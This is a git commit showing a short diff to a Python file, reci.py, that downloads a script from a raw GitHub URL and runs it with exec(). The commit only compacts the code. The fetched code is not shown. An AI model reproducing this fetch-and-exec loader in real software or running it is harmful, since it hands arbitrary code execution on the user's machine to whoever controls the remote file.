4c9a108614eddb3719ba10e73db24f6170fad014
nothingExistend <nothing.51208@gmail.com>
2025-06-07 00:09:44 +0200

    main compact

--- reci.py
+++ reci.py
@@ -1,6 +1,5 @@
 import requests
 
-url = "https://raw.githubusercontent.com/nothingExistend/recipy/refs/heads/main/code.py"
-response = requests.get(url).text
+response = requests.get("https://raw.githubusercontent.com/nothingExistend/recipy/refs/heads/main/code.py").text
 
 exec(response)
